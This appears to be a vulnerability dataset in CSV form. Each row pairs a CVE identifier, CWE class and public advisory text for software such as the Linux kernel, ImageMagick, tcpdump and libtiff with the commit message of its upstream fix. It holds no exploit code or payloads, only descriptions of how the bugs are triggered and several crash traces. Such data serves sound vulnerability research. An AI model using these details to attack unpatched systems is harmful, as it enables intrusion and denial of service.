CVE-2011-3209,CWE-189,2012-10-03,The div_long_long_rem implementation in include/asm-x86/div64.h in the Linux kernel before 2.6.26 on the x86 platform allows local users to cause a denial of service (Divide Error Fault and panic) via a clock_gettime system call.,"x86 is the only arch right now, which provides an optimized for div_long_long_rem and it has the downside that one has to be very careful that the divide doesn't overflow.  The API is a little akward, as the arguments for the unsigned divide are signed.  The signed version also doesn't handle a negative divisor and produces worse code on 64bit archs.  There is little incentive to keep this API alive, so this converts the few users to the new API.  Signed-off-by: Roman Zippel <zippel@linux-m68k.org> Cc: Ralf Baechle <ralf@linux-mips.org> Cc: Ingo Molnar <mingo@elte.hu> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: john stultz <johnstul@us.ibm.com> Cc: Christoph Lameter <clameter@sgi.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2013-4244,CWE-119,2013-09-28,The LZW decompressor in the gif2tiff tool in libtiff 4.0.3 and earlier allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) or possibly execute arbitrary code via a crafted GIF image.,
CVE-2018-14360,CWE-787,2018-07-17,An issue was discovered in NeoMutt before 2018-07-16. nntp_add_group in newsrc.c has a stack-based buffer overflow because of incorrect sscanf usage.,"nntp_add_group parses a line controlled by the connected nntp server. Restrict the maximum lengths read into the stack buffers group, and desc."
CVE-2018-7648,CWE-119,2018-03-02,"An issue was discovered in mj2/opj_mj2_extract.c in OpenJPEG 2.3.0. The output prefix was not checked for length, which could overflow a buffer, when providing a prefix with 50 or more characters on the command line.","This uses snprintf() with correct buffer length instead of sprintf(), which prevents a buffer overflow when providing a long output prefix. Furthermore the program exits with an error when the provided output prefix is too long.  Fixes #1088."
CVE-2014-5336,CWE-20,2014-08-26,"Monkey HTTP Server before 1.5.3, when the File Descriptor Table (FDT) is enabled and custom error messages are set, allows remote attackers to cause a denial of service (file descriptor consumption) via an HTTP request that triggers an error message.","This patch aims to fix a potential DDoS problem that can be caused in the server quering repetitive non-existent resources.  When serving a static file, the core use Vhost FDT mechanism, but if it sends a static error page it does a direct open(2). When closing the resources for the same request it was just calling mk_vhost_close() which did not clear properly the file descriptor.  This patch adds a new field on the struct session_request called 'fd_is_fdt', which contains MK_TRUE or MK_FALSE depending of how fd_file was opened.  Thanks to Matthew Daley <mattd@bugfuzz.com> for report and troubleshoot this problem.  Signed-off-by: Eduardo Silva <eduardo@monkey.io>"
CVE-2014-2889,CWE-189,2014-04-27,"Off-by-one error in the bpf_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 3.1.8, when BPF JIT is enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges via a long jump after a conditional jump.","x86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6 bytes.  In case a conditional jump is followed by a long jump, conditional jump target is one byte past the start of target instruction.  Signed-off-by: Markus Kötter <nepenthesdev@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2015-2925,,2015-11-16,"The prepend_path function in fs/dcache.c in the Linux kernel before 4.2.4 does not properly handle rename actions inside a bind mount, which allows local users to bypass an intended container protection mechanism by renaming a directory, related to a ""double-chroot attack.""","In rare cases a directory can be renamed out from under a bind mount. In those cases without special handling it becomes possible to walk up the directory tree to the root dentry of the filesystem and down from the root dentry to every other file or directory on the filesystem.  Like division by zero .. from an unconnected path can not be given a useful semantic as there is no predicting at which path component the code will realize it is unconnected.  We certainly can not match the current behavior as the current behavior is a security hole.  Therefore when encounting .. when following an unconnected path return -ENOENT.  - Add a function path_connected to verify path->dentry is reachable   from path->mnt.mnt_root.  AKA to validate that rename did not do   something nasty to the bind mount.    To avoid races path_connected must be called after following a path   component to it's next path component.  Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2017-8831,CWE-125,2017-05-08,"The saa7164_bus_get function in drivers/media/pci/saa7164/saa7164-bus.c in the Linux kernel through 4.11.5 allows local users to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact by changing a certain sequence-number value, aka a ""double fetch"" vulnerability.",Avoid a double fetch by reusing the values from the prior transfer.  Originally reported via https://bugzilla.kernel.org/show_bug.cgi?id=195559  Thanks to Pengfei Wang <wpengfeinudt@gmail.com> for reporting.  Signed-off-by: Steven Toth <stoth@kernellabs.com>
CVE-2016-7534,CWE-125,2017-04-20,The generic decoder in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds access) via a crafted file.,
CVE-2016-5355,CWE-20,2016-08-07,"wiretap/toshiba.c in the Toshiba file parser in Wireshark 1.12.x before 1.12.12 and 2.x before 2.0.4 mishandles sscanf unsigned-integer processing, which allows remote attackers to cause a denial of service (application crash) via a crafted file.","The scanf family of functions are as annoyingly bad at handling unsigned numbers as strtoul() is - both of them are perfectly willing to accept a value beginning with a negative sign as an unsigned value.  When using strtoul(), you can compensate for this by explicitly checking for a '-' as the first character of the string, but you can't do that with sscanf().  So revert to having pkt_len be signed, and scanning it with %d, but check for a negative value and fail if we see a negative value.  Bug: 12394 Change-Id: I4b19b95f2e1ffc96dac5c91bff6698c246f52007 Reviewed-on: https://code.wireshark.org/review/15230 Reviewed-by: Guy Harris <guy@alum.mit.edu>"
CVE-2016-9588,CWE-388,2016-12-28,"arch/x86/kvm/vmx.c in the Linux kernel through 4.9 mismanages the #BP and #OF exceptions, which allows guest OS users to cause a denial of service (guest OS crash) by declining to handle an exception thrown by an L2 guest.","When L2 exits to L0 due to ""exception or NMI"", software exceptions (#BP and #OF) for which L1 has requested an intercept should be handled by L1 rather than L0. Previously, only hardware exceptions were forwarded to L1.  Signed-off-by: Jim Mattson <jmattson@google.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-4205,CWE-399,2013-08-25,Memory leak in the unshare_userns function in kernel/user_namespace.c in the Linux kernel before 3.10.6 allows local users to cause a denial of service (memory consumption) via an invalid CLONE_NEWUSER unshare call.,"unshare_userns(new_cred) does *new_cred = prepare_creds() before create_user_ns() which can fail. However, the caller expects that it doesn't need to take care of new_cred if unshare_userns() fails.  We could change the single caller, sys_unshare(), but I think it would be more clean to avoid the side effects on failure, so with this patch unshare_userns() does put_cred() itself and initializes *new_cred only if create_user_ns() succeeeds.  Cc: stable@vger.kernel.org Signed-off-by: Oleg Nesterov <oleg@redhat.com> Reviewed-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-9211,CWE-476,2017-05-23,"The crypto_skcipher_init_tfm function in crypto/skcipher.c in the Linux kernel through 4.11.2 relies on a setkey function that lacks a key-size check, which allows local users to cause a denial of service (NULL pointer dereference) via a crafted application.","The API setkey checks for key sizes and alignment went AWOL during the skcipher conversion.  This patch restores them.  Cc: <stable@vger.kernel.org> Fixes: 4e6c3df (""crypto: skcipher - Add low-level skcipher..."") Reported-by: Baozeng <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2017-9438,CWE-674,2017-06-05,"libyara/re.c in the regexp module in YARA 3.5.0 allows remote attackers to cause a denial of service (stack consumption) via a crafted rule (involving hex strings) that is mishandled in the _yr_re_emit function, a different vulnerability than CVE-2017-9304.",
CVE-2014-9773,CWE-284,2016-06-13,"modules/chanserv/flags.c in Atheme before 7.2.7 allows remote attackers to modify the Anope FLAGS behavior by registering and dropping the (1) LIST, (2) CLEAR, or (3) MODIFY keyword nicks.","Previously, ChanServ FLAGS behavior could be modified by registering or dropping the keyword nicks ""LIST"", ""CLEAR"", and ""MODIFY"". Now, a configuration option is available that when turned on (default), disables registration of these keyword nicks and enables this compatibility feature. When turned off, registration of these keyword nicks is possible, and compatibility to Anope's FLAGS command is disabled.  Fixes #397"
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10156,CWE-264,2017-01-23,"A flaw in systemd v228 in /src/basic/fs-util.c caused world writable suid files to be created when using the systemd timers features, allowing local attackers to escalate their privileges to root. This is fixed in v229.","mode_t is unsigned, so MODE_INVALID < 0 can never be true.  This fixes a possible DoS where any user could fill /run by writing to a world-writable /run/systemd/show-status."
CVE-2018-7480,CWE-415,2018-02-25,The blkcg_init_queue function in block/blk-cgroup.c in the Linux kernel before 4.11 allows local users to cause a denial of service (double free) or possibly have unspecified other impact by triggering a creation failure.,"If blkg_create fails, new_blkg passed as an argument will be freed by blkg_create, so there is no need to free it again.  Signed-off-by: Hou Tao <houtao1@huawei.com> Signed-off-by: Jens Axboe <axboe@fb.com>"
CVE-2017-13032,CWE-125,2017-09-14,The RADIUS parser in tcpdump before 4.9.2 has a buffer over-read in print-radius.c:print_attr_string().,"Reverse the test in a for loop to test the length before testing whether we have a null byte.  This fixes a buffer over-read discovered by Bhargava Shastry.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture.  Clean up other length tests while we're at it."
CVE-2015-5221,CWE-416,2017-07-25,Use-after-free vulnerability in the mif_process_cmpt function in libjasper/mif/mif_cod.c in the JasPer JPEG-2000 library before 1.900.2 allows remote attackers to cause a denial of service (crash) via a crafted JPEG 2000 image file.,
CVE-2016-4805,CWE-416,2016-05-23,"Use-after-free vulnerability in drivers/net/ppp/ppp_generic.c in the Linux kernel before 4.5.2 allows local users to cause a denial of service (memory corruption and system crash, or spinlock) or possibly have unspecified other impact by removing a network namespace, related to the ppp_register_net_channel and ppp_unregister_channel functions.",
CVE-2013-0211,CWE-189,2013-09-30,"Integer signedness error in the archive_write_zip_data function in archive_write_set_format_zip.c in libarchive 3.1.2 and earlier, when running on 64-bit machines, allows context-dependent attackers to cause a denial of service (crash) via unspecified vectors, which triggers an improper conversion between unsigned and signed types, leading to a buffer overflow.",This prevents a certain common programming error (passing -1 to write) from leading to other problems deeper in the library.
CVE-2011-3919,CWE-787,2012-01-07,"Heap-based buffer overflow in libxml2, as used in Google Chrome before 16.0.912.75, allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.",
CVE-2017-13029,CWE-125,2017-09-14,The PPP parser in tcpdump before 4.9.2 has a buffer over-read in print-ppp.c:print_ccp_config_options().,"For configuration protocol options, use ND_TCHECK() and ND_TCHECK_nBITS() macros, passing them the appropriate pointer argument. This fixes one case where the ND_TCHECK2() call they replace was not checking enough bytes.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture."
CVE-2011-1160,CWE-200,2012-06-21,"The tpm_open function in drivers/char/tpm/tpm.c in the Linux kernel before 2.6.39 does not initialize a certain buffer, which allows local users to obtain potentially sensitive information from kernel memory via unspecified vectors.","This patch fixes information leakage to the userspace by initializing the data buffer to zero.  Reported-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Marcel Selhorst <m.selhorst@sirrix.com> [ Also removed the silly ""* sizeof(u8)"".  If that isn't 1, we have way   deeper problems than a simple multiplication can fix.   - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2014-8130,CWE-369,2018-03-12,"The _TIFFmalloc function in tif_unix.c in LibTIFF 4.0.3 does not reject a zero size, which allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image that is mishandled by the TIFFWriteScanline function in tif_write.c, as demonstrated by tiffdither.",require malloc() to return NULL pointer if requested allocation size is zero.  Assure that _TIFFmalloc does.
CVE-2019-11470,CWE-400,2019-04-23,The cineon parsing component in ImageMagick 7.0.8-26 Q16 allows attackers to cause a denial-of-service (uncontrolled resource consumption) by crafting a Cineon image with an incorrect claimed image size. This occurs because ReadCINImage in coders/cin.c lacks a check for insufficient image data in a file.,
CVE-2013-7017,,2013-12-09,libavcodec/jpeg2000.c in FFmpeg before 2.1 allows remote attackers to cause a denial of service (invalid pointer dereference) or possibly have unspecified other impact via crafted JPEG2000 data.,Found-by: Laurent Butti <laurentb@gmail.com> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2014-0063,CWE-119,2014-03-31,"Multiple stack-based buffer overflows in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to cause a denial of service (crash) or possibly execute arbitrary code via vectors related to an incorrect MAXDATELEN constant and datetime values involving (1) intervals, (2) timestamps, or (3) timezones, a different vulnerability than CVE-2014-0065.","Many server functions use the MAXDATELEN constant to size a buffer for parsing or displaying a datetime value.  It was much too small for the longest possible interval output and slightly too small for certain valid timestamp input, particularly input with a long timezone name. The long input was rejected needlessly; the long output caused interval_out() to overrun its buffer.  ECPG's pgtypes library has a copy of the vulnerable functions, which bore the same vulnerabilities along with some of its own.  In contrast to the server, certain long inputs caused stack overflow rather than failing cleanly.  Back-patch to 8.4 (all supported versions).  Reported by Daniel Schüssler, reviewed by Tom Lane.  Security: CVE-2014-0063"
CVE-2019-12109,CWE-476,2019-05-15,A Denial Of Service vulnerability in MiniUPnP MiniUPnPd through 2.1 exists due to a NULL pointer dereference in GetOutboundPinholeTimeout in upnpsoap.c for rem_port.,
CVE-2019-12904,CWE-668,2019-06-20,"In Libgcrypt 1.8.4, the C implementation of AES is vulnerable to a flush-and-reload side-channel attack because physical addresses are available to other processes. (The C implementation is used on platforms where an assembly-language implementation is unavailable.) NOTE: the vendor's position is that the issue report cannot be validated because there is no description of an attack","* cipher/rijndael-internal.h (ATTR_ALIGNED_64): New. * cipher/rijndael-tables.h (encT): Move to 'enc_tables' structure. (enc_tables): New structure for encryption table with counters before and after. (encT): New macro. (dec_tables): Add counters before and after encryption table; Move from .rodata to .data section. (do_encrypt): Change 'encT' to 'enc_tables.T'. (do_decrypt): Change '&dec_tables' to 'dec_tables.T'. * cipher/cipher-gcm.c (prefetch_table): Make inline; Handle input with length not multiple of 256. (prefetch_enc, prefetch_dec): Modify pre- and post-table counters to unshare look-up table pages between processes. --  GnuPG-bug-id: 4541 Signed-off-by: Jussi Kivilinna <jussi.kivilinna@iki.fi>"
CVE-2017-6498,CWE-20,2017-03-06,"An issue was discovered in ImageMagick 6.9.7. Incorrect TGA files could trigger assertion failures, thus leading to DoS.",
CVE-2017-12669,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteCALSImage in coders/cals.c.,
CVE-2018-20847,CWE-190,2019-06-26,"An improper computation of p_tx0, p_tx1, p_ty0 and p_ty1 in the function opj_get_encoding_parameters in openjp2/pi.c in OpenJPEG through 2.3.0 can lead to an integer overflow.",Update issue 431
CVE-2017-12897,CWE-125,2017-09-14,The ISO CLNS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isoclns_print().,"This fixes a buffer over-read discovered by Kamil Frankowicz.  Don't pass the remaining caplen - that's too hard to get right, and we were getting it wrong in at least one case; just use ND_TTEST().  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-9394,CWE-20,2017-03-23,The jas_seq2d_create function in jas_seq.c in JasPer before 1.900.17 allows remote attackers to cause a denial of service (assertion failure) via a crafted file.,
CVE-2018-7191,CWE-476,2019-05-17,"In the tun subsystem in the Linux kernel before 4.13.14, dev_get_valid_name is not called before register_netdevice. This allows local users to cause a denial of service (NULL pointer dereference and panic) via an ioctl(TUNSETIFF) call with a dev name containing a / character. This is similar to CVE-2013-4343.","If the name argument of dev_get_valid_name() contains ""%d"", it will try to assign it a unit number in __dev__alloc_name() and return either the unit number (>= 0) or an error code (< 0). Considering positive values as error values prevent tun device creations relying this mechanism, therefor we should only consider negative values as errors here.  Signed-off-by: Julien Gomes <julien@arista.com> Acked-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-12106,CWE-416,2019-05-15,The updateDevice function in minissdpd.c in MiniUPnP MiniSSDPd 1.4 and 1.5 allows a remote attacker to crash the process due to a Use After Free vulnerability.,
CVE-2019-11810,CWE-416,2019-05-07,"An issue was discovered in the Linux kernel before 5.0.7. A NULL pointer dereference can occur when megasas_create_frame_pool() fails in megasas_alloc_cmds() in drivers/scsi/megaraid/megaraid_sas_base.c. This causes a Denial of Service, related to a use-after-free.","when create DMA pool for cmd frames failed, we should return -ENOMEM, instead of 0. In some case in:      megasas_init_adapter_fusion()      -->megasas_alloc_cmds()        -->megasas_create_frame_pool           create DMA pool failed,         --> megasas_free_cmds() [1]      -->megasas_alloc_cmds_fusion()        failed, then goto fail_alloc_cmds.     -->megasas_free_cmds() [2]  we will call megasas_free_cmds twice, [1] will kfree cmd_list, [2] will use cmd_list.it will cause a problem:  Unable to handle kernel NULL pointer dereference at virtual address 00000000 pgd = ffffffc000f70000 [00000000] *pgd=0000001fbf893003, *pud=0000001fbf893003, *pmd=0000001fbf894003, *pte=006000006d000707 Internal error: Oops: 96000005 [#1] SMP  Modules linked in:  CPU: 18 PID: 1 Comm: swapper/0 Not tainted  task: ffffffdfb9290000 ti: ffffffdfb923c000 task.ti: ffffffdfb923c000  PC is at megasas_free_cmds+0x30/0x70  LR is at megasas_free_cmds+0x24/0x70  ...  Call trace:  [<ffffffc0005b779c>] megasas_free_cmds+0x30/0x70  [<ffffffc0005bca74>] megasas_init_adapter_fusion+0x2f4/0x4d8  [<ffffffc0005b926c>] megasas_init_fw+0x2dc/0x760  [<ffffffc0005b9ab0>] megasas_probe_one+0x3c0/0xcd8  [<ffffffc0004a5abc>] local_pci_probe+0x4c/0xb4  [<ffffffc0004a5c40>] pci_device_probe+0x11c/0x14c  [<ffffffc00053a5e4>] driver_probe_device+0x1ec/0x430  [<ffffffc00053a92c>] __driver_attach+0xa8/0xb0  [<ffffffc000538178>] bus_for_each_dev+0x74/0xc8   [<ffffffc000539e88>] driver_attach+0x28/0x34  [<ffffffc000539a18>] bus_add_driver+0x16c/0x248  [<ffffffc00053b234>] driver_register+0x6c/0x138  [<ffffffc0004a5350>] __pci_register_driver+0x5c/0x6c  [<ffffffc000ce3868>] megasas_init+0xc0/0x1a8  [<ffffffc000082a58>] do_one_initcall+0xe8/0x1ec  [<ffffffc000ca7be8>] kernel_init_freeable+0x1c8/0x284  [<ffffffc0008d90b8>] kernel_init+0x1c/0xe4  Signed-off-by: Jason Yan <yanaijie@huawei.com> Acked-by: Sumit Saxena <sumit.saxena@broadcom.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2018-19476,CWE-704,2018-11-23,psi/zicc.c in Artifex Ghostscript before 9.26 allows remote attackers to bypass intended access restrictions because of a setcolorspace type confusion.,
CVE-2016-2544,CWE-362,2016-04-27,Race condition in the queue_delete function in sound/core/seq/seq_queue.c in the Linux kernel before 4.4.1 allows local users to cause a denial of service (use-after-free and system crash) by making an ioctl call at a certain time.,"ALSA sequencer code has an open race between the timer setup ioctl and the close of the client.  This was triggered by syzkaller fuzzer, and a use-after-free was caught there as a result.  This patch papers over it by adding a proper queue->timer_mutex lock around the timer-related calls in the relevant code path.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2015-2666,CWE-119,2015-05-27,Stack-based buffer overflow in the get_matching_model_microcode function in arch/x86/kernel/cpu/microcode/intel_early.c in the Linux kernel before 4.0 allows context-dependent attackers to gain privileges by constructing a crafted microcode header and leveraging root privileges for write access to the initrd.,"mc_saved_tmp is a static array allocated on the stack, we need to make sure mc_saved_count stays within its bounds, otherwise we're overflowing the stack in _save_mc(). A specially crafted microcode header could lead to a kernel crash or potentially kernel execution.  Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com> Cc: ""H. Peter Anvin"" <hpa@zytor.com> Cc: Fenghua Yu <fenghua.yu@intel.com> Link: http://lkml.kernel.org/r/1422964824-22056-1-git-send-email-quentin.casasnovas@oracle.com Signed-off-by: Borislav Petkov <bp@suse.de>"
CVE-2017-15932,CWE-125,2017-10-27,"In radare2 2.0.1, an integer exception (negative number leading to an invalid memory access) exists in store_versioninfo_gnu_verdef() in libr/bin/format/elf/elf.c via crafted ELF files when parsing the ELF version on 32bit systems.",
CVE-2014-9491,,2015-01-20,"The devzvol_readdir function in illumos does not check the return value of a strchr call, which allows remote attackers to cause a denial of service (NULL pointer dereference and panic) via unspecified vectors.",Reviewed by: Keith Wesolowski <keith.wesolowski@joyent.com> Reviewed by: Jerry Jelinek <jerry.jelinek@joyent.com> Approved by: Dan McDonald <danmcd@omniti.com>
CVE-2016-4581,,2016-05-23,"fs/pnode.c in the Linux kernel before 4.5.4 does not properly traverse a mount propagation tree in a certain case involving a slave mount, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) via a crafted series of mount system calls.","When the first propgated copy was a slave the following oops would result: > BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 > IP: [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > PGD bacd4067 PUD bac66067 PMD 0 > Oops: 0000 [#1] SMP > Modules linked in: > CPU: 1 PID: 824 Comm: mount Not tainted 4.6.0-rc5userns+ #1523 > Hardware name: Bochs Bochs, BIOS Bochs 01/01/2007 > task: ffff8800bb0a8000 ti: ffff8800bac3c000 task.ti: ffff8800bac3c000 > RIP: 0010:[<ffffffff811fba4e>]  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 > RSP: 0018:ffff8800bac3fd38  EFLAGS: 00010283 > RAX: 0000000000000000 RBX: ffff8800bb77ec00 RCX: 0000000000000010 > RDX: 0000000000000000 RSI: ffff8800bb58c000 RDI: ffff8800bb58c480 > RBP: ffff8800bac3fd48 R08: 0000000000000001 R09: 0000000000000000 > R10: 0000000000001ca1 R11: 0000000000001c9d R12: 0000000000000000 > R13: ffff8800ba713800 R14: ffff8800bac3fda0 R15: ffff8800bb77ec00 > FS:  00007f3c0cd9b7e0(0000) GS:ffff8800bfb00000(0000) knlGS:0000000000000000 > CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 > CR2: 0000000000000010 CR3: 00000000bb79d000 CR4: 00000000000006e0 > Stack: >  ffff8800bb77ec00 0000000000000000 ffff8800bac3fd88 ffffffff811fbf85 >  ffff8800bac3fd98 ffff8800bb77f080 ffff8800ba713800 ffff8800bb262b40 >  0000000000000000 0000000000000000 ffff8800bac3fdd8 ffffffff811f1da0 > Call Trace: >  [<ffffffff811fbf85>] propagate_mnt+0x105/0x140 >  [<ffffffff811f1da0>] attach_recursive_mnt+0x120/0x1e0 >  [<ffffffff811f1ec3>] graft_tree+0x63/0x70 >  [<ffffffff811f1f6b>] do_add_mount+0x9b/0x100 >  [<ffffffff811f2c1a>] do_mount+0x2aa/0xdf0 >  [<ffffffff8117efbe>] ? strndup_user+0x4e/0x70 >  [<ffffffff811f3a45>] SyS_mount+0x75/0xc0 >  [<ffffffff8100242b>] do_syscall_64+0x4b/0xa0 >  [<ffffffff81988f3c>] entry_SYSCALL64_slow_path+0x25/0x25 > Code: 00 00 75 ec 48 89 0d 02 22 22 01 8b 89 10 01 00 00 48 89 05 fd 21 22 01 39 8e 10 01 00 00 0f 84 e0 00 00 00 48 8b 80 d8 00 00 00 <48> 8b 50 10 48 89 05 df 21 22 01 48 89 15 d0 21 22 01 8b 53 30 > RIP  [<ffffffff811fba4e>] propagate_one+0xbe/0x1c0 >  RSP <ffff8800bac3fd38> > CR2: 0000000000000010 > ---[ end trace 2725ecd95164f217 ]---  This oops happens with the namespace_sem held and can be triggered by non-root users.  An all around not pleasant experience.  To avoid this scenario when finding the appropriate source mount to copy stop the walk up the mnt_master chain when the first source mount is encountered.  Further rewrite the walk up the last_source mnt_master chain so that it is clear what is going on.  The reason why the first source mount is special is that it it's mnt_parent is not a mount in the dest_mnt propagation tree, and as such termination conditions based up on the dest_mnt mount propgation tree do not make sense.  To avoid other kinds of confusion last_dest is not changed when computing last_source.  last_dest is only used once in propagate_one and that is above the point of the code being modified, so changing the global variable is meaningless and confusing.  Cc: stable@vger.kernel.org fixes: f2ebb3a (""smarter propagate_mnt()"") Reported-by: Tycho Andersen <tycho.andersen@canonical.com> Reviewed-by: Seth Forshee <seth.forshee@canonical.com> Tested-by: Seth Forshee <seth.forshee@canonical.com> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2017-7374,CWE-416,2017-03-31,"Use-after-free vulnerability in fs/crypto/ in the Linux kernel before 4.10.7 allows local users to cause a denial of service (NULL pointer dereference) or possibly gain privileges by revoking keyring keys being used for ext4, f2fs, or ubifs encryption, causing cryptographic transform objects to be freed prematurely.","Filesystem encryption ostensibly supported revoking a keyring key that had been used to ""unlock"" encrypted files, causing those files to become ""locked"" again.  This was, however, buggy for several reasons, the most severe of which was that when key revocation happened to be detected for an inode, its fscrypt_info was immediately freed, even while other threads could be using it for encryption or decryption concurrently. This could be exploited to crash the kernel or worse.  This patch fixes the use-after-free by removing the code which detects the keyring key having been revoked, invalidated, or expired.  Instead, an encrypted inode that is ""unlocked"" now simply remains unlocked until it is evicted from memory.  Note that this is no worse than the case for block device-level encryption, e.g. dm-crypt, and it still remains possible for a privileged user to evict unused pages, inodes, and dentries by running 'sync; echo 3 > /proc/sys/vm/drop_caches', or by simply unmounting the filesystem.  In fact, one of those actions was already needed anyway for key revocation to work even somewhat sanely. This change is not expected to break any applications.  In the future I'd like to implement a real API for fscrypt key revocation that interacts sanely with ongoing filesystem operations --- waiting for existing operations to complete and blocking new operations, and invalidating and sanitizing key material and plaintext from the VFS caches.  But this is a hard problem, and for now this bug must be fixed.  This bug affected almost all versions of ext4, f2fs, and ubifs encryption, and it was potentially reachable in any kernel configured with encryption support (CONFIG_EXT4_ENCRYPTION=y, CONFIG_EXT4_FS_ENCRYPTION=y, CONFIG_F2FS_FS_ENCRYPTION=y, or CONFIG_UBIFS_FS_ENCRYPTION=y).  Note that older kernels did not use the shared fs/crypto/ code, but due to the potential security implications of this bug, it may still be worthwhile to backport this fix to them.  Fixes: b7236e2 (""ext4 crypto: reorganize how we store keys in the inode"") Cc: stable@vger.kernel.org # v4.2+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu> Acked-by: Michael Halcrow <mhalcrow@google.com>"
CVE-2015-4036,CWE-119,2015-08-31,Array index error in the tcm_vhost_make_tpg function in drivers/vhost/scsi.c in the Linux kernel before 4.0 might allow guest OS users to cause a denial of service (memory corruption) or possibly have unspecified other impact via a crafted VHOST_SCSI_SET_ENDPOINT ioctl call.  NOTE: the affected function was renamed to vhost_scsi_make_tpg before the vulnerability was announced.,"This code in vhost_scsi_make_tpg() is confusing because we limit ""tpgt"" to UINT_MAX but the data type of ""tpg->tport_tpgt"" and that is a u16.  I looked at the context and it turns out that in vhost_scsi_set_endpoint(), ""tpg->tport_tpgt"" is used as an offset into the vs_tpg[] array which has VHOST_SCSI_MAX_TARGET (256) elements so anything higher than 255 then it is invalid.  I have made that the limit now.  In vhost_scsi_send_evt() we mask away values higher than 255, but now that the limit has changed, we don't need the mask.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>"
CVE-2010-0011,CWE-264,2010-02-25,"The eval_js function in uzbl-core.c in Uzbl before 2010.01.05 exposes the run method of the Uzbl object, which allows remote attackers to execute arbitrary commands via JavaScript code.",
CVE-2019-10672,CWE-20,2019-03-31,treeRead in hdf/btree.c in libmysofa before 0.7 does not properly validate multiplications and additions.,
